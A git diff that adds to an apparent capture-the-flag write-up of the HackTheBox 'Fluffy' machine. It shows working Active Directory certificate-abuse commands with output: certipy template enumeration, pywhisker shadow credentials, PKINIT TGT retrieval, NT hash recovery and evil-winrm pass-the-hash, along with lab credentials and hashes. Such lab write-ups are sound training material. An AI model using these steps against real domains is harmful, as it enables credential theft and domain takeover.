@@ -330,3 +330,104 @@ Then finally the attacker can get a shell by using evil-winrm and the NT hash fr
 ```
 evil-winrm -i 10.10.11.69 -u winrm_svc -H "33bd09dcd697600edf6b3a7af4875767"
 ```
+
+
+<hr><hr><br>
+
+> [!NOTE]
+> I may be dumb bt some steps here are purely out of curiosity, noted down for future me to come back and burn current me
+
+
+ 
+ ![image](https://github.com/user-attachments/assets/e35ef17f-5dc3-470c-a683-a91737b5d6ce)
+
+
+
+Finding vulnerable certs with certipy, good snake !
+```certipy find -vulnerable -u "p.agila@fluffy.htb" -p "prometheusx-303" -dc-ip 10.10.11.69 -stdout```
+![image](https://github.com/user-attachments/assets/11ac771d-9f2e-4d89-a4ac-b5676c855d6c)
+
+get information about the ca_svc account using certipy
+```certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -user 'ca_svc' read```
+
+![image](https://github.com/user-attachments/assets/99d5c010-4f75-48c3-bae3-20476b154a67)
+
+
+Round 2 or using PKINIT and pywhisker to get the NT hash 
+<details>
+Start with pywhisker to add the thing 
+	
+```
+./pywhisker.py -d "fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "ca_svc" --action "add"
+
+[*] Searching for the target account
+[*] Target user found: CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID: c66a30df-0617-55ee-1419-d3d8c3978218
+[*] Updating the msDS-KeyCredentialLink attribute of ca_svc
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+[*] Converting PEM -> PFX with cryptography: zH1o4ezi.pfx
+[+] PFX exportiert nach: zH1o4ezi.pfx
+[i] Passwort für PFX: x87NE7ETjP6zv2QLtQ2M
+[+] Saved PFX (#PKCS12) certificate & key at path: zH1o4ezi.pfx
+[*] Must be used with password: x87NE7ETjP6zv2QLtQ2M
+[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
+```
+
+2. get the tgt 
+```
+python3 gettgtpkinit.py -cert-pem zH1o4ezi_cert.pem -key-pem zH1o4ezi_priv.pem fluffy.htb/ca_svc casvc.ccahce
+
+2025-07-08 23:58:26,792 minikerberos INFO     Loading certificate and key from file
+INFO:minikerberos:Loading certificate and key from file
+2025-07-08 23:58:26,806 minikerberos INFO     Requesting TGT
+INFO:minikerberos:Requesting TGT
+2025-07-08 23:58:27,529 minikerberos INFO     AS-REP encryption key (you might need this later):
+INFO:minikerberos:AS-REP encryption key (you might need this later):
+2025-07-08 23:58:27,529 minikerberos INFO     e56f3f68730ec21f712d9d4f8a4f39d5b9380d9e6005fcf28481063176793f6d
+INFO:minikerberos:e56f3f68730ec21f712d9d4f8a4f39d5b9380d9e6005fcf28481063176793f6d
+2025-07-08 23:58:27,537 minikerberos INFO     Saved TGT to file
+INFO:minikerberos:Saved TGT to file
+```
+
+3. get the hash
+```
+; export thhe variable first cuz getnt hash needs it this way 
+KRB5CCNAME=casvc.ccahce
+
+python3 getnthash.py -key "e56f3f68730ec21f712d9d4f8a4f39d5b9380d9e6005fcf28481063176793f6d" fluffy.htb/ca_svc
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Using TGT from cache
+[*] Requesting ticket to self with PAC
+Recovered NT Hash
+ca0f4f9e9eb8a092addf53bb03fc98c8
+```
+
+</details>
+
+Now we have the CA account's hash, ~~heavens~~ door open with pass the hash atatcks. 
+Starting with finding more vulnerabble certs.
+However, there is one issue  -> ```1280 20250709000915_Certipy.txt```
+So time to send the file to mr gpt ad it says its vulnerable to "ESC2/ESC3" attacks 
+
+![image](https://github.com/user-attachments/assets/325579f4-55f9-46b5-b2ee-ef475bebdda5)
+
+Change the UPN of ca_svc account 
+![image](https://github.com/user-attachments/assets/899cdeb5-92d9-4956-a238-2b2cf3600712)
+
+
+
+ok admin file get 
+![image](https://github.com/user-attachments/assets/c4ef6ca2-4019-421f-974c-2ffb167b0948)
+
+now we auth with admin cert file (pfx)
+![image](https://github.com/user-attachments/assets/41f6c767-5e03-43ba-b949-6de940d7ee58)
+
+
+![image](https://github.com/user-attachments/assets/978e6fb4-b3da-4a4d-a4ed-fc7a207c61c1)
+
+
+Final note : honestly i started wanting to kill myslelf, but now, windows ad seems fun (provided you udnerstand what the words mean
